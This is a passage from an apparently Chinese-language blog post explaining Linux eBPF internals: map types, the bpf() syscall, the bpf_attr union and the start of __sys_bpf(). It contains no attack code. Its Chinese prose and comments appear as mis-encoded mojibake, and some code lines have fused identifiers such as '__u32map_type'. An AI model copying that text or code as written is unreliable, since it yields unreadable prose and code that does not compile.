&#123;</span><br>BPF_MAP_TYPE_UNSPEC,<br>BPF_MAP_TYPE_HASH,<br>BPF_MAP_TYPE_ARRAY,<br>BPF_MAP_TYPE_PROG_ARRAY,<br>BPF_MAP_TYPE_PERF_EVENT_ARRAY,<br>BPF_MAP_TYPE_PERCPU_HASH,<br>BPF_MAP_TYPE_PERCPU_ARRAY,<br>BPF_MAP_TYPE_STACK_TRACE,<br>BPF_MAP_TYPE_CGROUP_ARRAY,<br>BPF_MAP_TYPE_LRU_HASH,<br>BPF_MAP_TYPE_LRU_PERCPU_HASH,<br>BPF_MAP_TYPE_LPM_TRIE,<br>BPF_MAP_TYPE_ARRAY_OF_MAPS,<br>BPF_MAP_TYPE_HASH_OF_MAPS,<br>BPF_MAP_TYPE_DEVMAP,<br>BPF_MAP_TYPE_SOCKMAP,<br>BPF_MAP_TYPE_CPUMAP,<br>BPF_MAP_TYPE_XSKMAP,<br>BPF_MAP_TYPE_SOCKHASH,<br>BPF_MAP_TYPE_CGROUP_STORAGE_DEPRECATED,<br><span class="hljs-comment">/* BPF_MAP_TYPE_CGROUP_STORAGE is available to bpf programs attaching</span><br><span class="hljs-comment"> * to a cgroup. The newer BPF_MAP_TYPE_CGRP_STORAGE is available to</span><br><span class="hljs-comment"> * both cgroup-attached and other progs and supports all functionality</span><br><span class="hljs-comment"> * provided by BPF_MAP_TYPE_CGROUP_STORAGE. So mark</span><br><span class="hljs-comment"> * BPF_MAP_TYPE_CGROUP_STORAGE deprecated.</span><br><span class="hljs-comment"> */</span><br>BPF_MAP_TYPE_CGROUP_STORAGE = BPF_MAP_TYPE_CGROUP_STORAGE_DEPRECATED,<br>BPF_MAP_TYPE_REUSEPORT_SOCKARRAY,<br>BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE,<br>BPF_MAP_TYPE_QUEUE,<br>BPF_MAP_TYPE_STACK,<br>BPF_MAP_TYPE_SK_STORAGE,<br>BPF_MAP_TYPE_DEVMAP_HASH,<br>BPF_MAP_TYPE_STRUCT_OPS,<br>BPF_MAP_TYPE_RINGBUF,<br>BPF_MAP_TYPE_INODE_STORAGE,<br>BPF_MAP_TYPE_TASK_STORAGE,<br>BPF_MAP_TYPE_BLOOM_FILTER,<br>BPF_MAP_TYPE_USER_RINGBUF,<br>BPF_MAP_TYPE_CGRP_STORAGE,<br>&#125;;<br></code></pre></td></tr></table></figure><p>å¸¸ç”¨çš„ä¸»è¦æ˜¯ä»¥ä¸‹å‡ ç§ç±»å‹ï¼š</p><ul><li><code>BPF_MAP_TYPE_HASH</code>ï¼šä»¥å“ˆå¸Œè¡¨å½¢å¼å­˜å‚¨é”®å€¼å¯¹ï¼Œæ¯”è¾ƒå¸¸è§„</li><li><code>BPF_MAP_TYPE_ARRAY</code>ï¼šä»¥æ•°ç»„å½¢å¼å­˜å‚¨é”®å€¼å¯¹ï¼Œ<strong>key å³ä¸ºæ•°ç»„ä¸‹æ ‡ï¼Œå¯¹åº”çš„ value çš†åˆå§‹åŒ–ä¸º 0</strong></li><li><code>BPF_MAP_TYPE_PROG_ARRAY</code>ï¼šç‰¹æ®Šçš„æ•°ç»„æ˜ å°„ï¼Œ<strong>value ä¸ºå…¶ä»– eBPF ç¨‹åºçš„æ–‡ä»¶æè¿°ç¬¦</strong></li><li><code>BPF_MAP_TYPE_STACK</code>ï¼šä»¥æ ˆå½¢å¼å­˜å‚¨æ•°æ®</li></ul><h3 id="map-wrapper"><a href="#map-wrapper" class="headerlink" title="map wrapper"></a>map wrapper</h3><h1 id="0x02-bpf-ç³»ç»Ÿè°ƒç”¨"><a href="#0x02-bpf-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="0x02.bpf ç³»ç»Ÿè°ƒç”¨"></a>0x02.bpf ç³»ç»Ÿè°ƒç”¨</h1><p>æˆ‘ä»¬å¯¹ eBPF æ‰€æœ‰çš„æ“ä½œå…¶å®éƒ½æ˜¯é€šè¿‡ <code>bpf</code> ç³»ç»Ÿè°ƒç”¨æ¥å®Œæˆçš„ï¼Œå…¶åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">bpf</span><span class="hljs-params">(<span class="hljs-type">int</span> cmd, <span class="hljs-keyword">union</span> bpf_attr *attr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size)</span>;<br></code></pre></td></tr></table></figure><h2 id="ä¸€ã€bpf-attr-ç»“æ„ä½“"><a href="#ä¸€ã€bpf-attr-ç»“æ„ä½“" class="headerlink" title="ä¸€ã€bpf_attr ç»“æ„ä½“"></a>ä¸€ã€bpf_attr ç»“æ„ä½“</h2><p>bpf ç³»ç»Ÿè°ƒç”¨ä¸­çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯æŒ‡å‘è”åˆä½“ <code>bpf_attr</code> çš„æŒ‡é’ˆï¼Œå®šä¹‰äº <code>kernel/bpf/syscall.c</code> ä¸­å¦‚ä¸‹ï¼Œå¯¹äºä¸åŒçš„ <code>cmd</code>  è€Œè¨€å…¶å«ä¹‰ä¸åŒï¼Œå› æ­¤è¿™é‡Œæ˜¯ä¸€ä¸ªç”±å¤šä¸ªç»“æ„ä½“æ„æˆçš„è”åˆä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_MAP_CREATE å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br>__u32map_type;<span class="hljs-comment">/* one of enum bpf_map_type */</span><br>__u32key_size;<span class="hljs-comment">/* key æŒ‰å­—èŠ‚è®¡çš„å¤§å° */</span><br>__u32value_size;<span class="hljs-comment">/* value æŒ‰å­—èŠ‚è®¡çš„å¤§å° */</span><br>__u32max_entries;<span class="hljs-comment">/* map ä¸­æœ€å¤§çš„ entries æ•°é‡ */</span><br>__u32map_flags;<span class="hljs-comment">/* BPF_MAP_CREATE ç›¸å…³çš„</span><br><span class="hljs-comment"> * åœ¨ä¸Šé¢å®šä¹‰çš„ flags.</span><br><span class="hljs-comment"> */</span><br>__u32inner_map_fd;<span class="hljs-comment">/* æŒ‡å‘å†…éƒ¨ map çš„ fd */</span><br>__u32numa_node;<span class="hljs-comment">/* numa node (ä»…å½“è®¾ç½®äº†</span><br><span class="hljs-comment"> * BPF_F_NUMA_NODE æ—¶æœ‰æ•ˆ).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span>map_name[BPF_OBJ_NAME_LEN];<br>__u32map_ifindex;<span class="hljs-comment">/* ifindex of netdev to create on */</span><br>__u32btf_fd;<span class="hljs-comment">/* æŒ‡å‘ä¸€ä¸ª BTF ç±»å‹æ•°æ®çš„ fd */</span><br>__u32btf_key_type_id;<span class="hljs-comment">/* BTF type_id of the key */</span><br>__u32btf_value_type_id;<span class="hljs-comment">/* BTF type_id of the value */</span><br>__u32btf_vmlinux_value_type_id;<span class="hljs-comment">/* BTF type_id of a kernel-</span><br><span class="hljs-comment">   * struct stored as the</span><br><span class="hljs-comment">   * map value</span><br><span class="hljs-comment">   */</span><br><span class="hljs-comment">/* Any per-map-type extra fields</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * BPF_MAP_TYPE_BLOOM_FILTER - æœ€ä½ 4 ä½æŒ‡ç¤ºäº†</span><br><span class="hljs-comment"> * å“ˆå¸Œå‡½æ•°çš„æ•°é‡(è‹¥ä¸º 0, bloom filter å°†é»˜è®¤</span><br><span class="hljs-comment"> * ä½¿ç”¨ 5 ä¸ªå“ˆå¸Œå‡½æ•°).</span><br><span class="hljs-comment"> */</span><br>__u64map_extra;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_MAP_*_ELEM å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br>__u32map_fd;<br>__aligned_u64key;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__aligned_u64 value;<br>__aligned_u64 next_key;<br>&#125;;<br>__u64flags;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_MAP_*_BATCH å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br>__aligned_u64in_batch;<span class="hljs-comment">/* start batch,</span><br><span class="hljs-comment"> * NULL to start from beginning</span><br><span class="hljs-comment"> */</span><br>__aligned_u64out_batch;<span class="hljs-comment">/* output: next start batch */</span><br>__aligned_u64keys;<br>__aligned_u64values;<br>__u32count;<span class="hljs-comment">/* input/output:</span><br><span class="hljs-comment"> * input: # of key/value</span><br><span class="hljs-comment"> * elements</span><br><span class="hljs-comment"> * output: # of filled elements</span><br><span class="hljs-comment"> */</span><br>__u32map_fd;<br>__u64elem_flags;<br>__u64flags;<br>&#125; batch;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_PROG_LOAD å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br>__u32prog_type;<span class="hljs-comment">/* one of enum bpf_prog_type */</span><br>__u32insn_cnt;<br>__aligned_u64insns;<br>__aligned_u64license;<br>__u32log_level;<span class="hljs-comment">/* verbosity level of verifier */</span><br>__u32log_size;<span class="hljs-comment">/* size of user buffer */</span><br>__aligned_u64log_buf;<span class="hljs-comment">/* user supplied buffer */</span><br>__u32kern_version;<span class="hljs-comment">/* not used */</span><br>__u32prog_flags;<br><span class="hljs-type">char</span>prog_name[BPF_OBJ_NAME_LEN];<br>__u32prog_ifindex;<span class="hljs-comment">/* ifindex of netdev to prep for */</span><br><span class="hljs-comment">/* For some prog types expected attach type must be known at</span><br><span class="hljs-comment"> * load time to verify attach type specific parts of prog</span><br><span class="hljs-comment"> * (context accesses, allowed helpers, etc).</span><br><span class="hljs-comment"> */</span><br>__u32expected_attach_type;<br>__u32prog_btf_fd;<span class="hljs-comment">/* fd pointing to BTF type data */</span><br>__u32func_info_rec_size;<span class="hljs-comment">/* userspace bpf_func_info size */</span><br>__aligned_u64func_info;<span class="hljs-comment">/* func info */</span><br>__u32func_info_cnt;<span class="hljs-comment">/* number of bpf_func_info records */</span><br>__u32line_info_rec_size;<span class="hljs-comment">/* userspace bpf_line_info size */</span><br>__aligned_u64line_info;<span class="hljs-comment">/* line info */</span><br>__u32line_info_cnt;<span class="hljs-comment">/* number of bpf_line_info records */</span><br>__u32attach_btf_id;<span class="hljs-comment">/* in-kernel BTF type id to attach to */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-comment">/* valid prog_fd to attach to bpf prog */</span><br>__u32attach_prog_fd;<br><span class="hljs-comment">/* or valid module BTF object fd or 0 to attach to vmlinux */</span><br>__u32attach_btf_obj_fd;<br>&#125;;<br>__u32core_relo_cnt;<span class="hljs-comment">/* number of bpf_core_relo */</span><br>__aligned_u64fd_array;<span class="hljs-comment">/* array of FDs */</span><br>__aligned_u64core_relos;<br>__u32core_relo_rec_size; <span class="hljs-comment">/* sizeof(struct bpf_core_relo) */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_OBJ_* å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br>__aligned_u64pathname;<br>__u32bpf_fd;<br>__u32file_flags;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_PROG_ATTACH/DETACH å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br>__u32target_fd;<span class="hljs-comment">/* container object to attach to */</span><br>__u32attach_bpf_fd;<span class="hljs-comment">/* eBPF program to attach */</span><br>__u32attach_type;<br>__u32attach_flags;<br>__u32replace_bpf_fd;<span class="hljs-comment">/* previously attached eBPF</span><br><span class="hljs-comment"> * program to replace if</span><br><span class="hljs-comment"> * BPF_F_REPLACE is used</span><br><span class="hljs-comment"> */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_PROG_TEST_RUN å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br>__u32prog_fd;<br>__u32retval;<br>__u32data_size_in;<span class="hljs-comment">/* input: len of data_in */</span><br>__u32data_size_out;<span class="hljs-comment">/* input/output: len of data_out</span><br><span class="hljs-comment"> *   returns ENOSPC if data_out</span><br><span class="hljs-comment"> *   is too small.</span><br><span class="hljs-comment"> */</span><br>__aligned_u64data_in;<br>__aligned_u64data_out;<br>__u32repeat;<br>__u32duration;<br>__u32ctx_size_in;<span class="hljs-comment">/* input: len of ctx_in */</span><br>__u32ctx_size_out;<span class="hljs-comment">/* input/output: len of ctx_out</span><br><span class="hljs-comment"> *   returns ENOSPC if ctx_out</span><br><span class="hljs-comment"> *   is too small.</span><br><span class="hljs-comment"> */</span><br>__aligned_u64ctx_in;<br>__aligned_u64ctx_out;<br>__u32flags;<br>__u32cpu;<br>__u32batch_size;<br>&#125; test;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_*_GET_*_ID å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u32start_id;<br>__u32prog_id;<br>__u32map_id;<br>__u32btf_id;<br>__u32link_id;<br>&#125;;<br>__u32next_id;<br>__u32open_flags;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_OBJ_GET_INFO_BY_FD å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br>__u32bpf_fd;<br>__u32info_len;<br>__aligned_u64info;<br>&#125; info;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_PROG_QUERY å‘½ä»¤æ‰€ä½¿ç”¨çš„åŒ¿åç»“æ„ä½“ */</span><br>__u32target_fd;<span class="hljs-comment">/* container object to query */</span><br>__u32attach_type;<br>__u32query_flags;<br>__u32attach_flags;<br>__aligned_u64prog_ids;<br>__u32prog_cnt;<br><span class="hljs-comment">/* output: per-program attach_flags.</span><br><span class="hljs-comment"> * not allowed to be set during effective query.</span><br><span class="hljs-comment"> */</span><br>__aligned_u64prog_attach_flags;<br>&#125; query;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* anonymous struct used by BPF_RAW_TRACEPOINT_OPEN command */</span><br>__u64 name;<br>__u32 prog_fd;<br>&#125; raw_tracepoint;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* anonymous struct for BPF_BTF_LOAD */</span><br>__aligned_u64btf;<br>__aligned_u64btf_log_buf;<br>__u32btf_size;<br>__u32btf_log_size;<br>__u32btf_log_level;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u32pid;<span class="hljs-comment">/* input: pid */</span><br>__u32fd;<span class="hljs-comment">/* input: fd */</span><br>__u32flags;<span class="hljs-comment">/* input: flags */</span><br>__u32buf_len;<span class="hljs-comment">/* input/output: buf len */</span><br>__aligned_u64buf;<span class="hljs-comment">/* input/output:</span><br><span class="hljs-comment"> *   tp_name for tracepoint</span><br><span class="hljs-comment"> *   symbol for kprobe</span><br><span class="hljs-comment"> *   filename for uprobe</span><br><span class="hljs-comment"> */</span><br>__u32prog_id;<span class="hljs-comment">/* output: prod_id */</span><br>__u32fd_type;<span class="hljs-comment">/* output: BPF_FD_TYPE_* */</span><br>__u64probe_offset;<span class="hljs-comment">/* output: probe_offset */</span><br>__u64probe_addr;<span class="hljs-comment">/* output: probe_addr */</span><br>&#125; task_fd_query;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_LINK_CREATE command */</span><br>__u32prog_fd;<span class="hljs-comment">/* eBPF program to attach */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u32target_fd;<span class="hljs-comment">/* object to attach to */</span><br>__u32target_ifindex; <span class="hljs-comment">/* target ifindex */</span><br>&#125;;<br>__u32attach_type;<span class="hljs-comment">/* attach type */</span><br>__u32flags;<span class="hljs-comment">/* extra flags */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u32target_btf_id;<span class="hljs-comment">/* btf_id of target to attach to */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__aligned_u64iter_info;<span class="hljs-comment">/* extra bpf_iter_link_info */</span><br>__u32iter_info_len;<span class="hljs-comment">/* iter_info length */</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-comment">/* black box user-provided value passed through</span><br><span class="hljs-comment"> * to BPF program at the execution time and</span><br><span class="hljs-comment"> * accessible through bpf_get_attach_cookie() BPF helper</span><br><span class="hljs-comment"> */</span><br>__u64bpf_cookie;<br>&#125; perf_event;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u32flags;<br>__u32cnt;<br>__aligned_u64syms;<br>__aligned_u64addrs;<br>__aligned_u64cookies;<br>&#125; kprobe_multi;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-comment">/* this is overlaid with the target_btf_id above. */</span><br>__u32target_btf_id;<br><span class="hljs-comment">/* black box user-provided value passed through</span><br><span class="hljs-comment"> * to BPF program at the execution time and</span><br><span class="hljs-comment"> * accessible through bpf_get_attach_cookie() BPF helper</span><br><span class="hljs-comment"> */</span><br>__u64cookie;<br>&#125; tracing;<br>&#125;;<br>&#125; link_create;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_LINK_UPDATE command */</span><br>__u32link_fd;<span class="hljs-comment">/* link fd */</span><br><span class="hljs-comment">/* new program fd to update link with */</span><br>__u32new_prog_fd;<br>__u32flags;<span class="hljs-comment">/* extra flags */</span><br><span class="hljs-comment">/* expected link&#x27;s program fd; is specified only if</span><br><span class="hljs-comment"> * BPF_F_REPLACE flag is set in flags */</span><br>__u32old_prog_fd;<br>&#125; link_update;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u32link_fd;<br>&#125; link_detach;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_ENABLE_STATS command */</span><br>__u32type;<br>&#125; enable_stats;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_ITER_CREATE command */</span><br>__u32link_fd;<br>__u32flags;<br>&#125; iter_create;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_PROG_BIND_MAP command */</span><br>__u32prog_fd;<br>__u32map_fd;<br>__u32flags;<span class="hljs-comment">/* extra flags */</span><br>&#125; prog_bind_map;<br><br>&#125; __attribute__((aligned(<span class="hljs-number">8</span>)));<br></code></pre></td></tr></table></figure><h2 id="äºŒã€-sys-bpf-ï¼šbpf-ç³»ç»Ÿè°ƒç”¨çš„æ ¸å¿ƒå‡½æ•°"><a href="#äºŒã€-sys-bpf-ï¼šbpf-ç³»ç»Ÿè°ƒç”¨çš„æ ¸å¿ƒå‡½æ•°" class="headerlink" title="äºŒã€__sys_bpf()ï¼šbpf ç³»ç»Ÿè°ƒç”¨çš„æ ¸å¿ƒå‡½æ•°"></a>äºŒã€__sys_bpf()ï¼šbpf ç³»ç»Ÿè°ƒç”¨çš„æ ¸å¿ƒå‡½æ•°</h2><p>bpf ç³»ç»Ÿè°ƒç”¨å®šä¹‰äº <code>kernel/bpf/syscall.c</code> ä¸­ï¼Œæœ€ç»ˆè°ƒç”¨åˆ° <code>__sys_bpf()</code> ï¼Œå…¶æ ¸å¿ƒä¸»è¦æ˜¯ä¸€ä¸ªå·¨å¤§çš„ switchï¼Œæ ¹æ® cmd çš„ä¸åŒè¿›è¡Œä¸åŒçš„æ“ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __sys_bpf(<span class="hljs-type">int</span> cmd, <span class="hljs-type">bpfptr_t</span> uattr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span>;</span><br><span class="hljs-type">bool</span> capable;<br><span class="hljs-type">int</span> err;<br><br>capable = bpf_capable() || !sysctl_unprivileged_bpf_disabled;<br><br><span class="hljs-comment">/* Intent here is for unprivileged_bpf_disabled to block key object</span><br><span class="hljs-comment"> * creation commands for unprivileged users; other actions depend</span><br><span class="hljs-comment"> * of fd availability and access to bpffs, so are dependent on</span><br><span class="hljs-comment"> * object creation success.  Capabilities are later verified for</span><br><span class="hljs-comment"> * operations such as load and map create, so even with unprivileged</span><br><span class="hljs-comment"> * BPF disabled, capability checks are still carried out for these</span><br><span class="hljs-comment"> * and other operations.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!capable &amp;&amp;<br>    (cmd == BPF_MAP_CREATE || cmd == BPF_PROG_LOAD))<br><span class="hljs-keyword">return</span> -EPERM;<br><br>err = bpf_check_uarg_tail_zero(uattr, <span class="hljs-keyword">sizeof</span>(attr), size);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br>size = <span class="hljs-type">min_t</span>(u32, size, <span class="hljs-keyword">sizeof</span>(attr));<br><br><span class="hljs-comment">/* copy attributes from user space, may be less than sizeof(bpf_attr) */</span><br><span class="hljs-built_in">memset</span>(&amp;attr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(attr));<br><span class="hljs-keyword">if</span> (copy_from_bpfptr(&amp;attr, uattr, size) != <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EFAULT;<br><br>err = security_bpf(cmd, &amp;attr, size);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> 